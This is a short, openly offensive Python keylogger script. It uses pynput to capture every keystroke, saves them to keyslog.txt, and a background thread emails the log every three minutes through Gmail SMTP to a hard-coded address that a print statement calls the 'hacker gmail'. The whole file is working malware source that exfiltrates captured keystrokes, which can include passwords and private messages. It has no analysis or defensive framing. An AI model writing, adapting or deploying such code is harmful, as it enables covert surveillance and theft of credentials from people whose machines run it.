from pynput import keyboard
import threading
import time
import os
import tempfile
import smtplib

all_key_pressed_ingiven_time = "";

time_delay_to_store_messagesin_second = 180;

file_name = 'keyslog.txt';



def send_mail(app_password,file_name_to_send):
    sender_add = 'satyamgrandmaster@gmail.com'  # storing the sender's mail id
    receiver_add = 'satyamgrandmaster@gmail.com'  # storing the receiver's mail id
      # storing the password to log in
    # creating the SMTP server object by giving SMPT server address and port number
    smtp_server = smtplib.SMTP("smtp.gmail.com", 587)
    smtp_server.ehlo()  # setting the ESMTP protocol
    smtp_server.starttls()  # setting up to TLS connection
    smtp_server.ehlo()  # calling the ehlo() again as encryption happens on calling startttls()
    smtp_server.login(sender_add, app_password)  # logging into out email id

    file = open(file_name_to_send, 'r')

    # DONT FORGET TO USE .ENCODE THE STRING, ELSE IT GIVE ERROR
    msg_to_be_sent = file.read().encode()

    # sending the mail by specifying the from and to address and the message
    smtp_server.sendmail(sender_add, receiver_add, msg_to_be_sent)
    # priting a message on sending the mail
    print('Successfully the mail is sent')
    smtp_server.quit()  # terminating the server


def saving_keylogs_to_textfile():

        with open(file_name, 'w') as file:
            # Write data to the file
            file.write(all_key_pressed_ingiven_time);
            
    



def on_key_press(key):
    try:
        # Print the key that was pressed
        global all_key_pressed_ingiven_time
        all_key_pressed_ingiven_time=all_key_pressed_ingiven_time+" "+key.char+" ";
        
        print(f'all Key pressed: {all_key_pressed_ingiven_time}')
        
        # print(f'Key pressed: {key.char}')
    except AttributeError:
        
        all_key_pressed_ingiven_time=all_key_pressed_ingiven_time+" "+str(key)
        
        print(f'all Key pressed: {all_key_pressed_ingiven_time}')
        
# Create a listener that listens for keyboard events

def keylogger_thread():
    with keyboard.Listener(
    on_press=on_key_press) as listener:

        listener.join()

def test():
    while True:
        print('sending saved keys to hacker gmail');
        
        saving_keylogs_to_textfile()
        
        send_mail(app_password='', file_name_to_send=file_name)
        
        global all_key_pressed_ingiven_time
        
        all_key_pressed_ingiven_time="";
        
        time.sleep(time_delay_to_store_messagesin_second)  # Sleep for 5 seconds between each test call

       
        
        
thread1 = threading.Thread(target=keylogger_thread)
thread2 = threading.Thread(target=test)

# Start the threads
thread1.start()
thread2.start()

# Wait for both threads to finish (you can remove these lines if you want to run indefinitely)
thread1.join()
thread2.join()
